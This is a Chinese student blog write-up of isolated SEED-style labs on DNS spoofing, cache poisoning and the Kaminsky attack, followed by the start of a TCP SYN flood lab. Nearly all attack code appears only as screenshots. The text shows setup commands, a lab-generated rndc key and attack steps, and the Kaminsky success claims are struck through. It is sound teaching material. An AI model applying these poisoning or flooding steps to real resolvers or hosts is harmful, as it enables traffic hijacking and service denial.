title="环境搭建"></a>环境搭建</h5><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223123436878.png" alt="image-20241223123436878"></p><h6 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h6><ol><li><p>加载镜像</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221020202769.png" alt="image-20241221020202769"></p></li><li><p>创建docker容器</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221020434548.png" alt="image-20241221020434548"></p></li><li><p>开启容器</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221020457355.png" alt="image-20241221020457355"></p></li><li><p>测试Local DNS Serve中是否能正确运行bind9</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rndc status<br></code></pre></td></tr></table></figure><p>如果报错，可能是没有生成rndc的配置文件和密钥，运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rndc-confgen<br></code></pre></td></tr></table></figure><p>返回了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@local-dns-server-10-9-0-53:/# rndc-confgen<br><span class="hljs-comment"># Start of rndc.conf</span><br>key <span class="hljs-string">&quot;rndc-key&quot;</span> &#123;<br>algorithm hmac-sha256;<br>secret <span class="hljs-string">&quot;vELiMCUV6P16BjZAZ3ayz1WpjDpQ0U+JU2QOOnfv74U=&quot;</span>;<br>&#125;;<br><br>options &#123;<br>default-key <span class="hljs-string">&quot;rndc-key&quot;</span>;<br>default-server 127.0.0.1;<br>default-port 953;<br>&#125;;<br><span class="hljs-comment"># End of rndc.conf</span><br><br><span class="hljs-comment"># Use with the following in named.conf, adjusting the allow list as needed:</span><br><span class="hljs-comment"># key &quot;rndc-key&quot; &#123;</span><br><span class="hljs-comment"># algorithm hmac-sha256;</span><br><span class="hljs-comment"># secret &quot;vELiMCUV6P16BjZAZ3ayz1WpjDpQ0U+JU2QOOnfv74U=&quot;;</span><br><span class="hljs-comment"># &#125;;</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># controls &#123;</span><br><span class="hljs-comment"># inet 127.0.0.1 port 953</span><br><span class="hljs-comment"># allow &#123; 127.0.0.1; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;</span><br><span class="hljs-comment"># &#125;;</span><br><span class="hljs-comment"># End of named.conf</span><br></code></pre></td></tr></table></figure><p>然后添加进<code>/etc/rndc.conf</code> 文件和<code>rndc.key</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">key &quot;rndc-key&quot; &#123;</span><br><span class="hljs-string">    algorithm hmac-sha256;</span><br><span class="hljs-string">    secret &quot;vELiMCUV6P16BjZAZ3ayz1WpjDpQ0U+JU2QOOnfv74U=&quot;;</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">options &#123;</span><br><span class="hljs-string">    default-key &quot;rndc-key&quot;;</span><br><span class="hljs-string">    default-server 127.0.0.1;</span><br><span class="hljs-string">    default-port 953;</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string">&#x27;</span> | <span class="hljs-built_in">tee</span> /etc/rndc.conf &gt; /dev/null<br></code></pre></td></tr></table></figure><p>以及</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;vELiMCUV6P16BjZAZ3ayz1WpjDpQ0U+JU2QOOnfv74U=&quot;</span> | <span class="hljs-built_in">tee</span> /etc/rndc.key &gt; /dev/null<br></code></pre></td></tr></table></figure><p>再次运行<code>rndc status</code>，得到正确返回</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222053201472.png" alt="image-20241222053201472"></p></li></ol><hr><h6 id="Summary-of-the-DNS-Configuration"><a href="#Summary-of-the-DNS-Configuration" class="headerlink" title="Summary of the DNS Configuration"></a>Summary of the DNS Configuration</h6><p><strong>Local DNS Server</strong></p><ol><li><p>另开一个终端，进入Local DNS Server，并且为了方便，将容器的主机名修改为<code>local-dns-server-10.9.0.53</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221025116813.png" alt="image-20241221025116813"></p></li><li><p>查看配置文件<code>etc/bind/named.conf</code>，可以看到Local DNS Server已经部署了bind9，接下来可以进行本地DNS服务器的一些配置<img src="https://gitee.com/r0otsu/images/raw/master/image-20241221024447833.png" alt="image-20241221024447833"></p></li><li><p><em><strong>Simplification.</strong></em> </p><p>在文件<code>/etc/bind/named.conf.options</code>中，将源端口号固定为33333，防止随机端口<img src="https://gitee.com/r0otsu/images/raw/master/image-20241221024655696.png" alt="image-20241221024655696"></p></li><li><p><em><strong>Turning off DNSSEC.</strong></em> </p><p>在文件<code>/etc/bind/named.conf.options</code>中，关闭DNSSEC，DNSSEC是用来防御DNS欺骗的机制，为了使攻击更容易实现</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221024901834.png" alt="image-20241221024901834"></p></li><li><p><em><strong>DNS cache.</strong></em></p><p>使用命令清除DNS缓存</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221025658558.png" alt="image-20241221025658558"></p></li><li><p><em><strong>Forwarding the attacker32.com zone.</strong></em></p><p>在配置文件<code>etc/bind/named.conf</code>中，设置了请求attacker32.com域名的请求，都会被转发到攻击主机10.9.0.153</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221025932484.png" alt="image-20241221025932484"></p></li></ol><hr><p><strong>User machine.</strong></p><ol><li><p>另开一个终端，进入user主机，并且为了方便，将容器的主机名修改为<code>user-10.9.0.5</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221030337587.png" alt="image-20241221030337587"></p></li><li><p>在<code>/etc/resolv.conf</code>文件中，添加一条nameserver记录，表示在进行DNS请求时，将Local DNS Server作为首要DNS服务器</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221030458768.png" alt="image-20241221030458768"></p></li></ol><hr><p><strong>Attacker’s Nameserver.</strong></p><ol><li><p>另开一个终端，进入Attacker’s Nameserver，并将hostname设置为<code>attacker-ns-10-9-0-153</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221031040807.png" alt="image-20241221031040807"></p></li><li><p>在<code>etc/bind/named.conf</code>文件中，设置了第一个为合法的<code>zone attacker32.com</code>，第二个为虚假的<code>example.com zone</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221031222413.png" alt="image-20241221031222413"></p></li></ol><p><strong>至此，环境全部部署完成了！</strong></p><hr><h6 id="Testing-the-DNS-Setup"><a href="#Testing-the-DNS-Setup" class="headerlink" title="Testing the DNS Setup"></a>Testing the DNS Setup</h6><p><strong>Get the IP address of ns.attacker32.com.</strong></p><ol><li><p>使用user主机向<code>ns.attacker32.com</code>发出DNS请求，发现返回的是attacker的ip，即Local DNS Server把请求转发给了Attacker’s Nameserver</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221033447401.png" alt="image-20241221033447401"></p></li></ol><p><strong>Get the IP address of <a href="http://www.example.com/">www.example.com</a>.</strong></p><ol><li><p>使用user主机向<code>www.example.com</code>发出DNS请求，Local DNS Server将查询发送到了互联网中example.com官方的nameserver</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221033726541.png" alt="image-20241221033726541"></p></li><li><p>从指定DNS服务器（ns.attacker32.com）上查询，查询直接发给ns.attacker32.com，并且其获得的结果与Attacker上的example.com zone文件中相同</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221033920451.png" alt="image-20241221033920451"></p></li></ol><p><strong>测试成功！</strong></p><hr><h5 id="Task-1-Directly-Spoofing-Response-to-User"><a href="#Task-1-Directly-Spoofing-Response-to-User" class="headerlink" title="Task 1: Directly Spoofing Response to User"></a>Task 1: Directly Spoofing Response to User</h5><ol><li><p>创建<code>spoof_ns_task1.py</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223082039051.png" alt="image-20241223082039051"></p></li><li><p>将这个文件复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241221050417985.png" alt="image-20241221050417985"></p></li><li><p><font color='red'>*注：</font>这里因为发现脚本要使用<font color='orange'>scapy的第三方库</font>，但是docker中并不好安装，所以更改了一下attacker的<code>Dockerfile</code>，将scapy安装进docker容器当中，如下图<font color='purple'>（因为一开始换源失败，还搜了一些资料终于找到了解决方法）</font>，修改完后重新<code>docker-compose build</code>以及<code>docker-compose up</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222032309538.png" alt="image-20241222032309538"></p></li><li><p>在attacker主机中运行<code>spoof_ns_task1.py</code>文件，可以发现不会报scapy的错误了，但是<font color='purple'>显示网卡没有监听到</font></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222034931511.png" alt="image-20241222034931511"></p></li><li><p>ifconfig一下，发现attacker主机中只有eth0网卡，<font color='green'>没有br-xxx的虚拟网卡</font></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222035117891.png" alt="image-20241222035117891"></p></li><li><p><font color='green'>尝试把<code>spoof_ns_task1.py</code>文件中的监听网卡改成eth0</font></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223082107753.png" alt="image-20241223082107753"></p></li><li><p><font color='green'>再次运行，发现可以运行了！</font></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222035510002.png" alt="image-20241222035510002"></p></li><li><p>记得首先Local DNS Server刷新一遍缓存<code>rnds flush</code><font color='red'>（如果报错请参照环境部署的第四点）</font></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222053325857.png" alt="image-20241222053325857"></p></li><li><p>在user主机发送请求</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222064156397.png" alt="image-20241222064156397"></p><p>这里看到并没有欺骗成功</p></li><li><p>尝试了好几次都没有成功，然后我发现在实验手册上有写（**<font color='red'>A potential issue.</font>**），可能是因为user在请求响应时，网络的响应比欺骗包的响应要更快，所以才会欺骗不成功</p></li><li><p>进入router容器，故意减慢向外发送的网络流量</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222064605333.png" alt="image-20241222064605333"></p><p>查看一下router和互联网连接(10.8.0.0)的网卡是eth0，所以执行对应的命令</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222064725073.png" alt="image-20241222064725073"></p></li><li><p>这里改了之后还是不行，返回了一样的，<font color='green'>所以把命令里的100ms改成了1000ms</font></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222064821546.png" alt="image-20241222064821546"></p></li><li><p>终于成功了（记得先在Local DNS Server上刷新）</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222064931342.png" alt="image-20241222064931342"></p><p>可以看到返回了想要的1.2.3.4，而且attacker主机上也显示发出了一个包</p></li></ol><p><strong>欺骗成功！</strong></p><hr><h5 id="Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers"><a href="#Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers" class="headerlink" title="Task 2: DNS Cache Poisoning Attack – Spoofing Answers"></a>Task 2: DNS Cache Poisoning Attack – Spoofing Answers</h5><ol><li><p>创建<code>spoof_ns_task2.py</code>文件，注意网卡，为了实现将DNS中的缓存欺骗</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222072348304.png" alt="image-20241222072348304"></p></li><li><p>将文件复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222072635378.png" alt="image-20241222072635378"></p></li><li><p>运行文件（记得先清除Local DNS Server的缓存）</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222072751190.png" alt="image-20241222072751190"></p></li><li><p><font color='orange'>这里在attacker容器里不管怎么弄都不能正确欺骗，所以还是用自己的主机试了一下成功了</font></p><p>（记得修改本机ubuntu中的<code>/etc/bind/named.conf</code>文件——<font color='green'>不能修改的话可能是因为没有安装bind</font>）</p></li><li><p>把<code>spoof_ns_task2.py</code>监听的网卡改了，改成连接10.9.0.1的虚拟网卡</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222123631916.png" alt="image-20241222123631916"></p></li><li><p>然后直接运行（先在Local DNS Server上清除缓存）</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241222123806764.png" alt="image-20241222123806764"></p><p>虽然有warning但还是正确运行了</p></li><li><p>在user1上发送请求，attacker端显示有发送欺骗包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223082727772.png" alt="image-20241223082727772"></p><p>返回了虚假的域名1.2.3.4</p><p><strong>欺骗成功了！</strong></p></li><li><p>在Local DNS Server上拉下缓存，并查找一下</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223082935503.png" alt="image-20241223082935503"></p><p>发现确实是已经在DNS缓存上都修改了，已经将<a href="http://www.example.com指向1.2.3.4了/">www.example.com指向1.2.3.4了</a></p></li></ol><p><strong>投毒成功！</strong></p><hr><h5 id="Task-3-Spoofing-NS-Records"><a href="#Task-3-Spoofing-NS-Records" class="headerlink" title="Task 3: Spoofing NS Records"></a>Task 3: Spoofing NS Records</h5><ol><li><p>创建<code>task3.py</code>，继续实现DNS欺骗，以达成访问任何example.com子域名的dns请求都会返回被某恶意域名服务器</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223084511898.png" alt="image-20241223084511898"></p></li><li><p>运行<code>task3.py</code>，以下是user主机请求不同example.com的域名返回的虚假域名</p><ol><li><p>example.com-&gt;1.2.3.4</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223085039589.png" alt="image-20241223085039589"></p></li><li><p><a href="http://www.example.com->1.2.3.5">www.example.com-&gt;1.2.3.5</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223085141780.png" alt="image-20241223085141780"></p></li><li><p>其他的 比如hello.example.com-&gt;1.2.3.6</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223085317505.png" alt="image-20241223085317505"></p></li></ol></li><li><p>在Local DNS Server中查看缓存</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223085646080.png" alt="image-20241223085646080"></p><p>可以看到不仅反映了刚刚显示的虚假域名，example.com域名也指向了恶意的网址</p></li></ol><p><strong>欺骗成功！</strong></p><hr><h5 id="Task-4-Spoofing-NS-Records-for-Another-Domain"><a href="#Task-4-Spoofing-NS-Records-for-Another-Domain" class="headerlink" title="Task 4: Spoofing NS Records for Another Domain"></a>Task 4: Spoofing NS Records for Another Domain</h5><ol><li><p>创建<code>task4.py</code>文件，，让ns.attacker32.com被用作 google.com的名称服务器，注意是<code>ns=NSsec2/NSsec1</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223091101766.png" alt="image-20241223091101766"></p></li><li><p>执行后，user主机访问<a href="http://www.example.com(记得local/">www.example.com（记得Local</a> DNS Server先rndc flush）</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223091234011.png" alt="image-20241223091234011"></p><p>返回的是虚假域名1.2.3.4</p></li><li><p>Local DNS Server获取缓存，发现不仅有example.com的域名也有google.com的域名</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223091427481.png" alt="image-20241223091427481"></p><p><strong>说明google.com已经被篡改成了恶意域名，欺骗成功！</strong></p></li><li><p>只有代码为 <code>ns=NSsec2/NSsec1</code> 时才能成功在本地DNS服务器的本地缓存中篡改，因为BIND 9在处理响应包中的 NS 信息时，会按照先后顺序依次去连接 NS 指向的域名，直到成功连接后就停止操作。</p><p>也就意味着，其在处理DNS响应数据包时，解析第一个NS信息，就连接成功了，导致第二个NS信息没有被解析</p></li></ol><p><strong>task4完成！</strong></p><hr><h5 id="Task-5-Spoofing-Records-in-the-Additional-Section"><a href="#Task-5-Spoofing-Records-in-the-Additional-Section" class="headerlink" title="Task 5: Spoofing Records in the Additional Section"></a>Task 5: Spoofing Records in the Additional Section</h5><ol><li><p>创建<code>task5.py</code>，添加超出域的附加记录</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223122506384.png" alt="image-20241223122506384"></p></li><li><p>运行<code>task5.py</code>，使用user主机访问<a href="http://www.example.com(记得先在local/">www.example.com（记得先在Local</a> DNS Server上rndc flush）</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223113257053.png" alt="image-20241223113257053"></p><p>可以看到已经成功欺骗了，返回域名为1.2.3.5</p></li><li><p>获取一下Local DNS Server的缓存</p><p>找到了ns.example.com</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223121913473.png" alt="image-20241223121913473"></p><p>和ns.attacker32.com</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223122034006.png" alt="image-20241223122034006"></p><p><strong>两个NS记录都有</strong></p><p><strong>除了第一个1.2.3.4的Additional记录之外，5.6.7.8和3.4.5.6的Additional记录都没有</strong></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223122620925.png" alt="image-20241223122620925"></p></li></ol><p><strong>说明DNS对于超出域的附加记录不会被处理，也不会返回给查询的客户端。</strong></p><hr><h4 id="The-Kaminsky-Attack-Lab"><a href="#The-Kaminsky-Attack-Lab" class="headerlink" title="The Kaminsky Attack Lab"></a><strong>The Kaminsky Attack Lab</strong></h4><h5 id="Lab-Environment-Setup-Task-1"><a href="#Lab-Environment-Setup-Task-1" class="headerlink" title="Lab Environment Setup (Task 1)"></a>Lab Environment Setup (Task 1)</h5><p>同<strong>Local DNS Attack Lab</strong></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223123413213.png" alt="image-20241223123413213"></p><p>欺骗目标变为<a href="http://www.example.com,该域名真实ip为93.184.216.34,由icann管理/">www.example.com,该域名真实ip为93.184.216.34，由ICANN管理</a></p><hr><h5 id="How-Kaminsky-attack-works"><a href="#How-Kaminsky-attack-works" class="headerlink" title="How Kaminsky attack works"></a>How Kaminsky attack works</h5><p>Kaminsky攻击是一种利用了DNS中漏洞的网络攻击。</p><p>DNS就像互联网上的电话本，可以把域名（比如<code>example.com</code>）转换成IP地址。Kaminsky攻击让攻击者能够篡改这个电话本，让DNS服务器错误地把一个域名指向攻击者指定的IP地址。</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223124934136.png" alt="image-20241223124934136"></p><p>而要实现Kaminsky攻击，需要遵循以下步骤：</p><ol><li><strong>寻找不存在的域名</strong>：攻击者向DNS服务器（比如Apollo）查询一个不存在的域名，比如<code>twysw.example.com</code>；</li><li><strong>DNS服务器请求信息</strong>：因为Apollo不知道这个域名，就去访问<code>example.com</code>的官方DNS服务器；</li><li><strong>伪造响应</strong>：在Apollo等待官方回应的时候，攻击者快速发送很多假的响应给Apollo，每个响应都有一个不同的随机生成的事务ID，希望其中一个能蒙对；</li><li><strong>绕过缓存</strong>：如果攻击者的假响应在官方响应之前到达Apollo，并且事务ID匹配，Apollo就会接受这个假响应，并把它存起来。如果假响应失败了，也没关系，攻击者可以换个名字再试一次，这样Apollo就得重新问一遍，攻击者就又有机会进行伪造了；</li><li><strong>替换DNS记录</strong>：如果攻击成功，Apollo就会错误地把<code>example.com</code>的DNS记录换成攻击者指定的服务器，这样其他人访问<code>example.com</code>时，可能会错误地指向攻击者控制的服务器。</li></ol><hr><h5 id="Task-2-Construct-DNS-request"><a href="#Task-2-Construct-DNS-request" class="headerlink" title="Task 2: Construct DNS request"></a>Task 2: Construct DNS request</h5><ol><li><p>创建<code>task2.py</code>文件，伪造从user给Local DNS Server发送DNS查询的数据包，让Local DNS Server向其他DNS Server发起查询</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223131111802.png" alt="image-20241223131111802"></p></li><li><p>打开wireshark，选择any进行监听</p><p>执行<code>task2.py</code>文件（记得先在Local DNS Server执行rndc flush）</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223132358034.png" alt="image-20241223132358034"></p></li><li><p>wireshark中监听到了DNS数据包，这个端口60232可以看出来确实发送了DNS请求</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223132306664.png" alt="image-20241223132306664"></p></li><li><p>往下看，发现Local DNS Server确实没有找到本地缓存的<a href="http://www.example.com域名,所以向别的dns进行请求了/">www.example.com域名，所以向别的DNS进行请求了</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223132833014.png" alt="image-20241223132833014"></p></li></ol><p><strong>task2完成！</strong></p><hr><h5 id="Task-3-Spoof-DNS-Replies"><a href="#Task-3-Spoof-DNS-Replies" class="headerlink" title="Task 3: Spoof DNS Replies."></a>Task 3: Spoof DNS Replies.</h5><ol><li><p>创建<code>task3.py</code>，伪造Local DNS Server返回<a href="http://www.example.com的响应/">www.example.com的响应</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223133856593.png" alt="image-20241223133856593"></p></li><li><p>打开wireshark，选择any进行监听</p><p>执行<code>task3.py</code>文件（记得先在Local DNS Server执行rndc flush）</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223134428349.png" alt="image-20241223134428349"></p></li><li><p>响应成功，虚假的response成功到达Local DNS Server</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223134641180.png" alt="image-20241223134641180"></p><p>指向了虚假的1.2.3.4</p></li></ol><p><strong>task3完成！</strong></p><hr><h5 id="Task-4-Launch-the-Kaminsky-Attack"><a href="#Task-4-Launch-the-Kaminsky-Attack" class="headerlink" title="Task 4: Launch the Kaminsky Attack"></a>Task 4: Launch the Kaminsky Attack</h5><ol><li><p>修改<code>gen_dns_request.py</code>文件如下，生成虚假的DNS请求包，并将包保存在<code>ip_req.bin</code>文件中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223142131796.png" alt="image-20241223142131796"></p></li><li><p>运行<code>gen_dns_request.py</code>文件，得到<code>ip_req.bin</code>文件，得到虚假的DNS请求包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223142355502.png" alt="image-20241223142355502"></p></li><li><p>修改<code>gen_dns_response.py</code>文件如下，生成虚假的DNS响应包，并将包保存在<code>ip_resp.bin</code>文件中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223142511309.png" alt="image-20241223142511309"></p></li><li><p>执行<code>gen_dns_response.py</code>文件，得到<code>ip_resp.bin</code>文件，得到虚假的DNS响应包</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223142653059.png" alt="image-20241223142653059"></p></li><li><p>修改<code>/Labsetup/Files/attack.c</code>文件</p><ol><li><p>send_dns_request()函数</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223223736844.png" alt="image-20241223223736844"></p></li><li><p>send_dns_response()函数</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223223756576.png" alt="image-20241223223756576"></p></li><li><p>main函数中的while循环</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223223828173.png" alt="image-20241223223828173"></p></li><li><p>记得修改函数声明</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223223857421.png" alt="image-20241223223857421"></p></li></ol></li><li><p>编译<code>attack.c</code>文件并运行，attacker发送大量的虚假包并进行虚假响应，并尝试写入Local DNS Server的缓存中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223143521319.png" alt="image-20241223143521319"></p></li><li><p><del>可以看到Local DNS Server已经能看到被欺骗了</del></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223223701684.png" alt="image-20241223223701684"></p></li></ol><p><strong><del>task4完成！</del></strong></p><hr><h5 id="Task-5-Result-Verification"><a href="#Task-5-Result-Verification" class="headerlink" title="Task 5: Result Verification"></a><del>Task 5: Result Verification</del></h5><ol><li><p>使用user终端请求<a href="http://www.example.com,验证实验结果/">www.example.com，验证实验结果</a></p></li><li><p>请求时的抓包观察</p></li><li><p>再直接向attacker的DNS Server进行请求</p></li><li><p>请求时的抓包观察</p></li></ol><p><strong><del>验证Kaminsky Attack已经成功了！</del></strong></p><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 10</title>
    <link href="/2024/12/25/lab10/"/>
    <url>/2024/12/25/lab10/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-10-TCP攻击实验"><a href="#Lab-10-TCP攻击实验" class="headerlink" title="Lab 10-TCP攻击实验"></a>Lab 10-TCP攻击实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>本实验的学习目标是让学生获得有关漏洞以及针对这些漏洞的攻击的第一手经验。聪明人从错误中学习。在安全教育中，我们研究导致软件漏洞的错误。研究过去的错误不仅有助于学生理解为什么系统容易受到攻击，为什么“看似良性”的错误会变成灾难，以及为什么需要许多安全机制。更重要的是，它还帮助学生了解漏洞的常见模式，从而避免将来犯类似的错误。此外，使用漏洞作为案例研究，学生可以学习安全设计、安全编程和安全测试的原则。</p><p>TCP&#x2F;IP协议中的漏洞代表了协议设计和实现中的一种特殊类型的漏洞；它们提供了一个宝贵的教训，说明了为什么安全性应该从一开始就设计好，而不是事后才加上。此外，研究这些漏洞有助于学生了解网络安全的挑战以及为什么需要许多网络安全措施。在本实验中，学生将对TCP进行几个攻击。本实验涵盖以下主题：</p><ul><li>TCP协议</li><li>TCP SYN洪水攻击和SYN cookie</li><li>TCP重置攻击</li><li>TCP会话劫持攻击</li><li>反向Shell</li></ul><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h4><ol><li><p>启动容器</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220044730943.png" alt="image-20241220044730943"></p></li><li><p>为了方便分辨容器，进入四个容器，并对主机名进行更改</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220062831080.png" alt="image-20241220062831080"></p></li></ol><hr><h4 id="Task-1-SYN-Flooding-Attack"><a href="#Task-1-SYN-Flooding-Attack" class="headerlink" title="Task 1: SYN Flooding Attack"></a>Task 1: SYN Flooding Attack</h4><h5 id="Task-1-1-Launching-the-Attack-Using-Python"><a href="#Task-1-1-Launching-the-Attack-Using-Python" class="headerlink" title="Task 1.1: Launching the Attack Using Python"></a>Task 1.1: Launching the Attack Using Python</h5><ol><li><p>创建<code>synflood.py</code>，用于执行synflood攻击</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220061126645.png" alt="image-20241220061126645"></p></li><li><p>将<code>synflood.py</code>复制到attacker主机中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220071208869.png" alt="image-20241220071208869"></p></li><li><p>此时victim主机的tcp连接为</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220071354035.png" alt="image-20241220071354035"></p></li><li><p>attacker主机运行<code>synflood.py</code>，此时查看victim主机的tcp连接</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220071632801.png" alt="image-20241220071632801"></p><p><strong>被泛洪攻击了</strong></p></li><li><p>查看一下victim主机中处于<code>SYN_RECV</code>状态的TCP连接的数量，可以看出连接数量非常多</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220071843127.png" alt="image-20241220071843127"></p></li><li><p>此时 user1主机telnet 连接victim主机</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220072654358.png" alt="image-20241220072654358"></p></li></ol><p><strong>完全不影响连接，很快就连接上了</strong></p><hr><h5 id="Task-1-2-Launch-the-Attack-Using-C"><a href="#Task-1-2-Launch-the-Attack-Using-C" class="headerlink" title="Task 1.2: Launch the Attack Using C"></a>Task 1.2: Launch the Attack Using C</h5><ol><li><p>先清空一下</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220073420198.png" alt="image-20241220073420198"></p></li><li><p>进入<code>volumes</code>文件夹，编译<code>synflood.c</code>文件，将可执行文件<code>synflood</code>复制到攻击主机中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220073554633.png" alt="image-20241220073554633"></p></li><li><p>在attacker主机中运行，victim主机中又出现了大量的tcp连接</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220073916140.png" alt="image-20241220073916140"></p></li><li><p>查看tcp连接的数量</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241220074013552.png" alt="image-20241220074013552"></p><p><strong>可以看到数量非常的多，泛洪攻击成功了！</strong></p></li><li><p>使用user1主机telnet连接victim主机</p><p><img 